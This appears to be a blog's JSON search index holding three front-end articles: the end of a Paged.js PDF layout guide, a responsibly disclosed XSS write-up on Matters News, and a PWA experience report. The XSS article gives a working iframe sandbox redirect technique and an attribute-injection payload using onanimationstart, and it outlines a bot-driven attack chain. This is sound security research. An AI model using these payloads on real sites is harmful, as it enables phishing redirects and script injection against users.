第一頁內容 &lt;/div> &lt;div class=\"page\"> &lt;div class=\"title\">這是第二頁標題&lt;/div> 第二頁內容 &lt;/div> The divs with the title class above will not appear in the content of the document, but will be pulled to the top center position. The content of the title will also change with the page, which is a super convenient feature! The footer in the example is done like this: @page &#123; @bottom-left &#123; content: element(footer); &#125; &#125; .footer &#123; position: running(footer); font-size: 1rem; color: #999; border-top: 2px solid #ccc; &#125; &lt;div class=\"footer\"> &lt;p>本文件僅供教學使用，請勿用於商業之用途&lt;/p> &lt;/div> In addition to customizing the content, the style of those cells can also be customized. For example, in the example, I changed the background color of the entire header, because these cells actually have default classes, so you can use CSS to do it: .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top-left-corner-holder, .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top, .pagedjs_page:not([data-page-number=\"1\"]) .pagedjs_margin-top-right-corner-holder &#123; background: #658db4; outline: 2px #658db4; &#125; The reason why .pagedjs_page:not([data-page-number=&quot;1&quot;]) is added at the front is because I don’t want to touch the first page, so I used this selector to exclude the first page. The outline is because I found that sometimes the header seems to have a white line, and I guess it may be a rendering problem, so I want to see if I can cover it up: Custom page numbersRegarding the page number, Paged.js provides two CSS counters that can be used: counter(page) and counter(pages). If you want to add page numbers in the upper right corner like the example, you can write it like this: @page &#123; @top-right &#123; color: white; content: \"第 \" counter(page) \" 頁，共 \" counter(pages) \" 頁\"; &#125; &#125; This way you can add page numbers anywhere! And you can customize the format, and if you want to adjust the style, you can do it directly. Automatic continuation of table headIn fact, when using the native HTML table tag, there is already a function that the table head will automatically continue. It’s just that Paged.js may have some problems in processing, so this function is gone. But it is not difficult to add it back. I found a simple piece of code that can solve this problem, source: Repeat table header on subsequent pages &lt;script> // @see: https://gitlab.pagedmedia.org/tools/pagedjs/issues/84#note_535 class RepeatingTableHeaders extends Paged.Handler &#123; constructor(chunker, polisher, caller) &#123; super(chunker, polisher, caller); &#125; afterPageLayout(pageElement, page, breakToken, chunker) &#123; // Find all split table elements let tables = pageElement.querySelectorAll(\"table[data-split-from]\"); tables.forEach((table) => &#123; // Get the reference UUID of the node let ref = table.dataset.ref; // Find the node in the original source let sourceTable = chunker.source.querySelector(\"[data-ref='\" + ref + \"']\"); // Find if there is a header let header = sourceTable.querySelector(\"thead\"); if (header) &#123; // Clone the header element let clonedHeader = header.cloneNode(true); // Insert the header at the start of the split table table.insertBefore(clonedHeader, table.firstChild); &#125; &#125;); &#125; &#125; Paged.registerHandlers(RepeatingTableHeaders); &lt;/script> Remember to use the table tag in HTML, like this: &lt;table> &lt;thead> &lt;tr> &lt;th>網址&lt;/th> &lt;th>文章名稱&lt;/th> &lt;th>瀏覽次數&lt;/th> &lt;th>跳出率&lt;/th> &lt;/tr> &lt;/thead> &lt;tbody> &lt;tr> &lt;td>blog.huli.tw&lt;/td> &lt;td>CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？&lt;/td> &lt;td>34532&lt;/td> &lt;td>52.3%&lt;/td> &lt;/tr> &lt;/tbody> &lt;/table> ConclusionThe sample code above is quite short, and most of it is CSS. Before using this set, I really didn’t think that so many things could be adjusted through CSS. I am very satisfied with Paged.js myself. It is currently the best solution I think for front-end HTML to PDF layout. One of the reasons is what I said before. Except for it, I have not found any other libraries that can support custom headers, footers, and page numbers. It is really amazing to use, because it provides solutions to all the needs I want to solve, and it is actually quite easy to use. The only downside may be the white line of about 1px that can be seen in some screenshots above. I guess it may be a rendering problem of the browser or something related to the PDF viewer. But it should not be difficult to cover it up, and the most troublesome thing is to draw a line to cover it up. The functions I need are all in the example code. If you want to see the complete example code, I put it here: https://github.com/aszx87410/demo/blob/master/print/print.html If you want more functions, you can refer to the documentation and official website of Paged.js: https://www.pagedjs.org/ I recommend this to anyone with similar needs as mine. I hope Paged.js can also solve your problems. Or if you know of any pure front-end packages that are better than Paged.js, please recommend them to me.","link":"/2021/06/12/en/paged-js-htmo-to-pdf-best-solution/"},{"title":"Preventing XSS may be more difficult than you think","text":"PrefaceIf you don’t know what XSS (Cross-site Scripting) is, in simple terms, it is when a hacker can execute JavaScript code on your website. Since it can be executed, it is possible to steal the user’s token, impersonate the user’s identity to log in, even if the token cannot be stolen, it can still modify the page content, or redirect the user to a phishing website, and so on. To prevent XSS, it is necessary to prevent hackers from executing code on the website, and there are many ways to defend against it. For example, CSP (Content-Security-Policy) can be used as an HTTP response header to prevent the execution of inline scripts or restrict the domains from which scripts can be loaded. Trusted Types can also be used to prevent some potential attacks and specify rules, or use some libraries that filter XSS, such as DOMPurify and js-xss. But is it enough to use these? Yes and no. If used correctly, of course, there is no problem, but if there are incorrect settings, there may still be XSS vulnerabilities. Recently, I just transferred from a company to a cybersecurity team, Cymetrics, and when I was researching some websites, I found a ready-made case. Therefore, this article uses this ready-made case to illustrate what is called incorrect settings and what impact this setting will have. Incorrect settings, unexpected resultsMatters News is a decentralized writing community platform, and all the code is open source! For this kind of blog platform, what I like to see most is how they handle content filtering. With a curious and research-oriented attitude, let’s take a look at how they do it in the article and comment sections. The server-side filtering code is here: matters-server&#x2F;src&#x2F;common&#x2F;utils&#x2F;xss.ts: import xss from 'xss' const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; const onIgnoreTagAttr = (tag: string, name: string, value: string) => &#123; /** * Allow attributes of whitelist tags start with \"data-\" or \"class\" * * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data- */ if (name.substr(0, 5) === 'data-' || name.substr(0, 5) === 'class') &#123; // escape its value using built-in escapeAttrValue function return name + '=\"' + xss.escapeAttrValue(value) + '\"' &#125; &#125; const ignoreTagProcessor = ( tag: string, html: string, options: &#123; [key: string]: any &#125; ) => &#123; if (tag === 'input' || tag === 'textarea') &#123; return '' &#125; &#125; const xssOptions = &#123; whiteList: &#123; ...xss.whiteList, ...CUSTOM_WHITE_LISTS &#125;, onIgnoreTagAttr, onIgnoreTag: ignoreTagProcessor, &#125; const customXSS = new xss.FilterXSS(xssOptions) export const sanitize = (string: string) => customXSS.process(string) What is worth noting here is this part: const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; This part allows the tags and attributes that can be used, and the content of the attributes will also be filtered. For example, although iframe and src attributes are allowed, &lt;iframe src=&quot;javascript:alert(1)&quot;&gt; will not work because src starting with javascript: will be filtered out. It’s not enough to just look at the server-side, we also need to see how the client-side renders. For displaying articles, it is like this: src&#x2F;views&#x2F;ArticleDetail&#x2F;Content&#x2F;index.tsx &lt;> &lt;div className=&#123;classNames(&#123; 'u-content': true, translating &#125;)&#125; dangerouslySetInnerHTML=&#123;&#123; __html: optimizeEmbed(translation || article.content), &#125;&#125; onClick=&#123;captureClicks&#125; ref=&#123;contentContainer&#125; /> &lt;style jsx>&#123;styles&#125;&lt;/style> &lt;/> Matters’ frontend uses React, and everything rendered in React is escaped by default, so there are basically no XSS vulnerabilities. But sometimes we don’t want it to be filtered, such as the content of an article, we may need some tags to be rendered as HTML, and then we can use dangerouslySetInnerHTML, which will render the content directly as innerHTML and will not be filtered. So generally, the approach is to use js-xss + dangerouslySetInnerHTML to ensure that the rendered content is HTML but not XSS. Here, before passing in dangerouslySetInnerHTML, there is a function called optimizeEmbed, and you can continue to trace down to src&#x2F;common&#x2F;utils&#x2F;text.ts: export const optimizeEmbed = (content: string) => &#123; return content .replace(/\\&lt;iframe /g, '&lt;iframe loading=\"lazy\"') .replace( /&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?>/g, (match, src, offset) => &#123; return /* html */ ` &lt;picture> &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w', ext: 'webp' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> &lt;source media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> &lt;source type=\"image/webp\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '540w', ext: 'webp' &#125;)&#125; /> &lt;img src=$&#123;src&#125; srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '540w' &#125;)&#125; loading=\"lazy\" /> &lt;/picture> ` &#125; ) &#125; Here, RegExp is used to extract the img src, and then the HTML is directly spliced together using string concatenation. Then, see toSizedImageURL: export const toSizedImageURL = (&#123; url, size, ext &#125;: ToSizedImageURLProps) => &#123; const assetDomain = process.env.NEXT_PUBLIC_ASSET_DOMAIN ? `https://$&#123;process.env.NEXT_PUBLIC_ASSET_DOMAIN&#125;` : '' const isOutsideLink = url.indexOf(assetDomain) &lt; 0 const isGIF = /gif/i.test(url) if (!assetDomain || isOutsideLink || isGIF) &#123; return url &#125; const key = url.replace(assetDomain, ``) const extedUrl = changeExt(&#123; key, ext &#125;) const prefix = size ? '/' + PROCESSED_PREFIX + '/' + size : '' return assetDomain + prefix + extedUrl &#125; As long as the domain is the assets’ domain and meets other conditions, it will be returned after some string processing. Seeing this, you can roughly understand the entire rendering process of the article. js-xss is used to filter on the server-side, and dangerouslySetInnerHTML is used to render on the client-side. Among them, some processing is done on the img tag, and the img is changed to load different images for different resolutions or screen sizes using picture + source. The above is the entire process of rendering articles on this website. Before continuing to read, you can think about whether there are any problems? &#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D;&#x3D;&#x3D; Lightning Protection Separator &#x3D;&#x3D; First problem: Incorrect attribute filteringDid you notice any problems with the filtering here? const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; Opening iframe should be to allow users to embed things like YouTube videos, but the problem is that this website does not specify a valid domain using CSP, so the src here can be filled in randomly. I can make a website myself and embed it using iframe. If the webpage is designed well, it will look like a part of this website: The above is just a random example, mainly to give you an idea. If you really want to attack, you can make it more sophisticated and more attractive. If that’s all, whether the attack can succeed depends on whether the content can be trusted by the user. But actually, more can be done. Do you know that you can manipulate the external website inside the iframe? The things that cross-origin windows can access are limited, and the only thing that can be changed is location, which means that we can redirect the embedded website: &lt;script> top.location = 'https://google.com' &lt;/script> If I do this, I can redirect the entire website to anywhere. The simplest application that can be thought of is to redirect to a phishing website. The success rate of such phishing websites is relatively high because users may not even realize that they have been redirected to another website. In fact, browsers have defenses against such redirects, and the above code will produce an error: Unsafe attempt to initiate navigation for frame with origin ‘https://matters.news‘ from frame with URL ‘https://53469602917d.ngrok.io/‘. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See https://www.chromestatus.com/features/5851021045661696. Uncaught DOMException: Failed to set the ‘href’ property on ‘Location’: The current window does not have permission to navigate the target frame to ‘https://google.com‘ Because it is not the same origin, the iframe will be prevented from redirecting the top-level window. However, this can be bypassed, and it will use the sandbox attribute. This attribute actually specifies what permissions the embedded iframe has, so as long as it is changed to: &lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;, it can successfully redirect the top-level window and redirect the entire website. This vulnerability has been found in both GitLab and codimd. There are several ways to fix this issue. The first one is to remove the sandbox attribute so that it cannot be used. If it is needed somewhere, the value inside should be checked, and the more dangerous allow-top-navigation should be removed. Another way is to restrict the location of the iframe src, which can be done at different levels. For example, filtering src in the code and only allowing specific domains, or using CSP:frame-src to let the browser block domains that do not comply. The second issue: Unfiltered HTMLThe first issue can cause the biggest danger, probably just a redirect (the codimd article says that XSS can be done in Safari, but I can’t do it QQ). However, there is a bigger problem besides this, which is here: &lt;> &lt;div className=&#123;classNames(&#123; 'u-content': true, translating &#125;)&#125; dangerouslySetInnerHTML=&#123;&#123; __html: optimizeEmbed(translation || article.content), &#125;&#125; onClick=&#123;captureClicks&#125; ref=&#123;contentContainer&#125; /> &lt;style jsx>&#123;styles&#125;&lt;/style> &lt;/> article.content is an HTML string filtered by js-xss, so it is safe. However, here it goes through an optimizeEmbed to do custom conversion, which is a more dangerous thing to do after filtering, because if there is negligence in the process, it will cause an XSS vulnerability. In the conversion, there is a piece of code: &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w', ext: 'webp' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> Looking closely at this code, if $&#123;toSizedImageURL(&#123; url: src, size: &#39;1080w&#39;, ext: &#39;webp&#39; &#125;)&#125; or src can be controlled, there is a chance to change the content of the attribute or add a new attribute. I originally wanted to insert a malicious src to make onerror become onerror=&quot;this.srcset=&#39;test&#39;;alert(1)&quot; and other code, but I later found that the onerror event of the source under the picture seems to be invalid, even if there is an error in srcset, it will not trigger, so it is useless. Therefore, I focused on srcSet and inserting new attributes. Here, onanimationstart can be used, which is an event that will be triggered when the animation starts, and the name of the animation can be found in CSS. Fortunately, I found a keyframe called spinning. So if the img src is: https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337) The combined code is: &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337) onerror=\"this.srcset='$&#123;src&#125;'\" /> In this way, an XSS vulnerability is created: There are several ways to fix it: Add a CSP header to prevent the execution of inline scripts (this is more difficult to achieve because it may conflict with existing things and requires more time to process). Filter the img url passed in (there is still a risk if the filtering is not done well). Change the HTML first and then call js-xss to filter out the attributes that should not exist. SummaryWe found two vulnerabilities: Redirect users to any location through &lt;iframe&gt; Execute an XSS attack on the article page through &lt;source&gt; What kind of attack can actually be done? First, use the second vulnerability to publish an article with an XSS attack, and then write a bot to leave a message under all articles, using &lt;iframe&gt; to redirect users to the article with XSS. In this way, as long as the user clicks on any article, they will be attacked. However, the defense of other parts of the website itself is well done. Although there is XSS, the Cookie is HttpOnly, so it cannot be stolen, and the password modification is sent by email, so the password cannot be modified. It seems that it is not possible to do really serious things. Many libraries that filter XSS are safe (although sometimes there are still vulnerabilities found, such as bypassing DOMPurify), but people who use the library may ignore some settings or do extra things, resulting in HTML that is still unsafe. When dealing with user input, every step should be carefully reviewed to avoid negligence. It is also recommended to set up CSP headers as a last line of defense against XSS attacks. Although some CSP rules can be bypassed, it is still better than having nothing. Matters has its own Bug Bounty Program, which offers rewards for finding vulnerabilities that can prove harmful. The XSS vulnerability found in this article is classified as High, with a value of $150 USD. The team believes that open source can benefit technical professionals and make websites more secure, so they hope everyone knows about this program. Finally, thanks to the Matters team for their quick response and handling, and thanks to the colleagues at Cymetrics. Timeline: May 7, 2021: Vulnerability reported May 12, 2021: Received confirmation from the Matters team that they are fixing the vulnerability May 12, 2021: Asked for permission to publish the article after the fix, received permission May 13, 2021: Fix completed","link":"/2021/05/25/en/prevent-xss-is-not-that-easy/"},{"title":"PWA Practical Experience Sharing","text":"PrefaceRecently, I was busy with the product redesign of my company, switching from the original PHP to backend Go + frontend React SPA. It was divided into two different projects, desktop version and mobile version. Since we were redesigning, we naturally wanted to include the latest and coolest PWA in our goals. Although I had heard of PWA for a long time, I had never implemented it before, so I had the opportunity to try it out. Now that the product has been redesigned and has been online for two or three months, it has gradually stabilized. In the process of optimizing PWA, I have gained some experience that I can share with everyone. Before giving some practical examples, let’s talk about what PWA is. What is PWA?From Google’s official document: Your First Progressive Web App, we can see some detailed definitions of PWA. However, I don’t like this kind of standardized rules. For me, PWA is a Web App that is very similar to Native App, and browser support also accounts for a large part of it. In the past, no matter how much your website looked like a Native App, you still had two difficulties that couldn’t be overcome: when offline, it was GG, and it couldn’t be installed on a mobile phone. So no matter how you look at it, people know that you are a Web App and will never look like Native. However, since the browser began to support Service Worker and manifest, these two points have been overcome! Thanks to Service Worker, the webpage can also operate when offline, and you can write code to decide what to render. The browser’s “Add to Home Screen” function makes it possible to install Web Apps, and developers can also use manifest.json to customize some content, such as the startup screen and the name displayed on the home screen. For me, if you can use the above two technologies to successfully install your Web App on a mobile phone and make it look no different from Native App, I think it can be called PWA. I have shared what PWA looks like on a mobile phone in my previous article (CORS is not as simple as I thought), so I won’t go into details here. I remember being scared the first time I experienced installing PWA because it looks no different from Native App. If it is really well done, it should be difficult to distinguish. It is obviously a webpage but looks like Native App, which is PWA. Next, let’s introduce several important factors of PWA. You must have the following things to do PWA. manifest.jsonFirst, let’s talk about manifest.json. Anyone who has written Android knows that there is something called AndroidManifest.xml. In fact, the two are essentially the same thing, describing some characteristics of this App. Let’s take a look at the example given in Google’s official document: The Web App Manifest: &#123; \"short_name\": \"Maps\", \"name\": \"Google Maps\", \"icons\": [ &#123; \"src\": \"/images/icons-192.png\", \"type\": \"image/png\", \"sizes\": \"192x192\" &#125;, &#123; \"src\": \"/images/icons-512.png\", \"type\": \"image/png\", \"sizes\": \"512x512\" &#125; ], \"start_url\": \"/maps/?source=pwa\", \"background_color\": \"#3367D6\", \"display\": \"standalone\", \"scope\": \"/maps/\", \"theme_color\": \"#3367D6\" &#125; The information given inside is very simple and is closely related to what appears when you add PWA to the home screen. name is the name of your App, which will be displayed on the home screen. However, if you also provide short_name, it will be used first. Next, icons are the logos that appear on the home screen, which is self-explanatory. start_url is the place where you will connect when you open it from the home screen. Many people will add ?source=pwa or something similar, so you can know that this user is using PWA, which is convenient for statistics. There is a small point to note here, that is, in a certain version of iOS Safari (sorry, I forgot which version it was, but the latest one no longer has this problem), it will not follow start_url! It will be based on the URL you used to install PWA. For example, when you are in https://example.com/test/123 and click “Add to Home Screen”, when you open PWA on the home screen, you will connect to this screen. This part is actually quite troublesome, but fortunately, the latest iOS Safari no longer has this problem, so you don’t have to worry about it. Another thing to mention is that name, background_color, and icon will automatically form Splash screens, which is the screen you will see when you open PWA. It is automatically composed by Chrome based on these three pieces of information, which means you cannot customize this startup screen. It will display the background color you specified, then place an icon in the middle and your app name below it. There is nothing else you can adjust, at least for now. In this regard, iOS is different. iOS does not support this type of startup screen, but the advantage is that you can set it yourself through html tags! &lt;link rel='apple-touch-startup-image' href='/assets/splash/splash-1125x2436.png' media='(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)' /> There are some size-related settings that you need to prepare a picture for each different device. For details, please refer to: Progressive Web App Splash Screens or Few Tips That Will Make Your PWA on iOS Feel Like Native. The difference between iOS and Android is that you can put a picture on the iOS startup screen, so it can be fully customized. You can put whatever you want, and it has a higher degree of freedom than Android. Also, for the icon part, iOS does not look at your mainfest.json settings, but looks at its own html tag, so you must set an additional icon for iOS to use: &lt;link rel='apple-touch-icon' sizes='192x192' href='/assets/favicons/iOS192x192.png' /> For manifest.json, these are the points to note. In fact, the biggest problem is support, so Google has a PWACompat that can automatically adjust your files and html tags for old browsers. However, someone wrote an article: You shouldn’t use Chrome’s PWACompat library in your Progressive Web Apps to tell everyone not to use it. The argument is that you cannot generalize like this. You must understand the differences between each platform and browser and then adapt to get the best user experience. This unified adjustment method may look okay in many places, but it is strange in many places. Since iOS has been mentioned above, let’s talk about some of the differences in iOS. In fact, iOS began to support PWA this year (2018), and the support was quite poor when it was first launched, but it is slowly improving. These two articles explain the differences in iOS very clearly: PWAs are coming to iOS 11.3: Cupertino, we have a problem and Progressive Web Apps on iOS are here 🚀. One of the biggest differences is that many times it does not look at manifest.json, and you need to set some corresponding html tags yourself to make it work. This point needs to be paid special attention to. Then there is the &lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt; tag, which is also very important. It mainly tells the browser: “I am ready to provide a full-screen experience, even if the browser UI is hidden.” This article: Don’t use iOS meta tags irresponsibly in your Progressive Web Apps tells you not to abuse this tag, otherwise your Web App experience on Safari will become very poor because many things are not supported. As for Safari’s biggest problem, I will directly quote one of the paragraphs from PWAs are coming to iOS 11.3: Cupertino, we have a problem: Also, it’s a massive problem for apps with two-factor authentication, such as Twitter. If you need to go to another app to get a token or to open a text message or an email, you will get out of the PWA. When you go back to paste the code, you are out of context and, you need to start the login process again losing the validity of that code. It happened to me on Twitter! Which means, the Twitter PWA on iOS is completely unusable for me. This is a huge problem, especially for apps that require two-factor authentication, such as Twitter. If you need to switch to another app to get a token or open a text message or email, you will be taken out of the PWA. When you return to paste the code, you will be out of context and will need to start the login process again, losing the validity of the code. This happened to me on Twitter! This means that the Twitter PWA on iOS is completely unusable for me. Regarding the issue with iOS and the manifest.json, it is similar to what was mentioned earlier. Now, let’s talk about the second key point of PWAs: Service Worker. Service WorkerThe purpose of adding a Service Worker is solely for caching. Through the Service Worker (SW), we can intercept and process requests before they are sent. The principle of offline operation is also based on this. We register the SW on the first opening and use it to download and cache static files. If the user goes offline, we can use the cached files to respond, so no real requests are sent, and there is no connection failure. Google provides a convenient tool called Workbox to help us automatically generate SW and use more convenient syntax to intercept requests. For example, I use the Webpack plugin: new workboxPlugin.InjectManifest(&#123; swSrc: path.join(__dirname, '..', SRC_DIR, 'sw.js'), swDest: path.join(__dirname, '..', DIST_DIR, 'sw.js'), globDirectory: path.join(__dirname, '..', DIST_DIR), globPatterns: ['**/*.&#123;js,css&#125;'] &#125;), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) By writing this, it will automatically find files that meet the rules and add them to the cache list. When you register the SW, those files will be cached. In addition, Workbox can also listen to URLs: // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args => workbox.strategies .networkFirst(&#123; cacheName: 'data-cache', plugins: [ new workbox.expiration.Plugin(&#123; maxEntries: 100, maxAgeSeconds: 2592000 &#125;) ] &#125;) .handle(args) .then(response => &#123; return response &#125;) .catch(err => &#123; console.log('err:', err) &#125;) ) The above code caches requests containing api in the path, so API responses that were previously cached can be used when offline. Workbox provides several strategies for dynamic caching, including staleWhileRevalidate, cacheFirst, networkFirst, networkOnly, and cacheOnly. You can roughly understand the strategy from the name. For more details, please refer to the official document: Workbox Strategies. Since the introduction of Workbox, we basically don’t need to write SW manually anymore. We can rely on its provided API and functions to automatically generate SW that meets our needs. Add to home screen bannerFinally, let’s talk about the “Install PWA” feature. On iOS Safari, there is no other way but to bring up the menu and select “Add to home screen.” However, on Android Chrome, if you meet certain conditions (have set mainfest.json and registered Service Worker), a cute Install banner will automatically pop up for you. (Image from: Changes to Add to Home Screen Behavior) Depending on the version of Chrome, the behavior is different. In Chrome 67 and earlier versions, if you don’t use preventDefault() or explicitly call prompt() in the beforeinstallprompt event, a large A2HS banner will appear on the left. Then, in Chrome 68 and later versions, no matter what you do, the system will automatically display the Mini-infobar. However, if the user closes it, it will take three months to appear again, which is quite long. Next, both A2HS banners and Mini-infobar will display the A2HS Dialog on the right after the user clicks on them, prompting the user to install the PWA. However, in Chrome 68 and later versions, you can also use the event.prompt() obtained in beforeinstallprompt to display this dialog through code. It sounds a bit complicated, right? Let’s first introduce the beforeinstallprompt event. This event will be triggered when everything is ready and it is confirmed that you meet the conditions to display the prompt. It will pass an event, and you can prevent the prompt from being displayed and save this event: // 此範例來自上面的官方文件 let installPromptEvent; window.addEventListener('beforeinstallprompt', (event) => &#123; // Prevent Chrome &lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector('#install-button').disabled = false; &#125;); Why save it? Because the user may not want to see this popup as soon as they open the website, or they may be checking out and you are interfering with them. So save it and call installPromptEvent.prompt() to display the Dialog at an appropriate time. But one thing to note is that calling installPromptEvent.prompt() directly is useless. You must do it within a user gesture, which means you have to put it in the click event of a button (or other event triggered by the user) to be effective. Directly calling it is useless and will cause an error message to appear in the console. I was curious about how it was judged before, but later I found out that there is event.isTrusted that can be used to determine whether an event is triggered actively by the user. Reference: MDN - Event.isTrusted. Anyway, because Chrome has different behaviors on different versions, we finally decided to use the following code to have different responses for different versions: // 把 event 存起來 var installPromptEvent // 要顯示 prompt 的延遲 var showTime = 30 * 1000 window.addEventListener('beforeinstallprompt', function (e) &#123; e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data &amp;&amp; data.length >= 2) ? parseInt(data[2], 10) : null if (version &amp;&amp; installPromptEvent.prompt) &#123; // 延遲一段時間才顯示 prompt setTimeout(function() &#123; // 如果 Chrome 版本是 67（含）以下，可以直接呼叫 if (version &lt;= 67) &#123; installPromptEvent.prompt() return &#125; // 否則的話必須透過 user action 主動觸發 // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt document.querySelector('#root').addEventListener('click', addToHomeScreen) &#125;, showTime) &#125; &#125;); function addToHomeScreen(e) &#123; if (installPromptEvent) &#123; installPromptEvent.prompt() installPromptEvent = null document.querySelector('#root').removeEventListener('click', addToHomeScreen) &#125; &#125; If it is below 67, you can directly call it to display the prompt. Otherwise, you need to add an event listener, and we also choose to delay it for 30 seconds before displaying it. Surprisingly, this small change brought amazing growth. Originally, only about 20-30 people installed the PWA per day. After this adjustment, it suddenly increased eight to ten times. I was also surprised when I saw the statistical chart in GA. I didn’t expect the effect to be so good. Instead of actively asking others to install the PWA, it is better to only require people who are really interested in your product (staying for more than 30 seconds). Manifest ObservationFinally, let’s take a look at how some well-known PWAs write their manifest.json. The first is the well-known flipkart: &#123; \"name\": \"Flipkart Lite\", \"short_name\": \"Flipkart Lite\", \"icons\": [ &#123; \"src\": \"https://img1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125; ], \"gcm_sender_id\": \"656085505957\", \"gcm_user_visible_only\": true, \"start_url\": \"/?start_url=homescreenicon\", \"permissions\": [ \"gcm\" ], \"orientation\": \"portrait\", \"display\": \"standalone\", \"theme_color\": \"#2874f0\", \"background_color\": \"#2874f0\" &#125; Next is the famous twitter: &#123; \"background_color\": \"#ffffff\", \"description\": \"It's what's happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\", \"display\": \"standalone\", \"gcm_sender_id\": \"49625052041\", \"gcm_user_visible_only\": true, \"icons\": [ &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125; ], \"name\": \"Twitter\", \"share_target\": &#123; \"action\": \"compose/tweet\", \"params\": &#123; \"title\": \"title\", \"text\": \"text\", \"url\": \"url\" &#125; &#125;, \"short_name\": \"Twitter\", \"start_url\": \"/\", \"theme_color\": \"#ffffff\", \"scope\": \"/\" &#125; Finally, Google I&#x2F;O 2018: &#123; \"name\": \"Google I/O 2018\", \"short_name\": \"I/O 2018\", \"start_url\": \"./?utm_source=web_app_manifest\", \"display\": \"standalone\", \"theme_color\": \"#6284F3\", \"background_color\": \"#6284F3\", \"icons\": [&#123; \"src\": \"static/images/homescreen/homescreen57.png\", \"sizes\": \"57x57\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen114.png\", \"sizes\": \"114x114\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen128.png\", \"sizes\": \"128x128\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen144.png\", \"sizes\": \"144x144\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen512.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125;], \"prefer_related_applications\": false, \"related_applications\": [&#123; \"platform\": \"play\", \"id\": \"com.google.samples.apps.iosched\" &#125;], \"gcm_sender_id\": \"103953800507\" &#125; I like to observe these things from other people’s homes, because you will find a lot of information that you missed or couldn’t find when you searched, and you will also have a concept of which attributes are particularly commonly used. In addition to manifest.json, you can also refer to the tags in html to learn a lot. ConclusionRecently, after struggling with PWA and being squeezed by PM, I collected a lot of information related to PWA and referred to many useful articles. I sincerely thank those predecessors for sharing, which can avoid later generations from stepping on a lot of pits. Although the experience on iOS is a bit poor, overall, I still have high hopes for the development of PWA. The first is that Google strongly promotes it, and the second is that the support of browsers is getting higher and higher. As I said above, iOS Safari has slowly fixed the bugs, and future functions will be more complete. Moreover, the user experience of PWA is very good, with acceptable speed and the flexibility of the Web. The key is that there is no need to download it from Google Play, which eliminates a threshold for conversion (although there is still a threshold for installing PWA, but I think it is easier), and Chrome also provides many 